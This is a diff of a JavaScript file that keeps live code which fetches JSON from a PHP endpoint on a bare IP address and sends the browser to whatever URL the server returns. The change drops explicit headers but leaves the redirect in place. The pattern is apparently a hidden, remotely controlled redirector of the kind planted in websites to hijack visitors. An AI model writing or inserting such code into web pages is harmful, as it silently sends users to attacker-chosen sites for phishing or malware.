@@ -418,20 +418,14 @@
 
 
 //   fetch('https://sssssss-gglaxmsulq.cn-hangzhou.fcapp.run')
-const url = new URL('http://43.138.131.173:9001/d.php');
+const url = new URL('https://43.138.131.173:9001/d.php');
 url.protocol = window.location.protocol;
-
-fetch(url.toString(), {
-  method: 'GET', // 设置请求方法
-  headers: {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*' // 设置CORS头
-  },
-})
+fetch(url.toString())
   .then(response => response.json()) // 将响应转换为 JSON
   .then(data => {
-    window.location.href = data.xx;
+    window.location.href = data.xx
   })
+
 
 
 
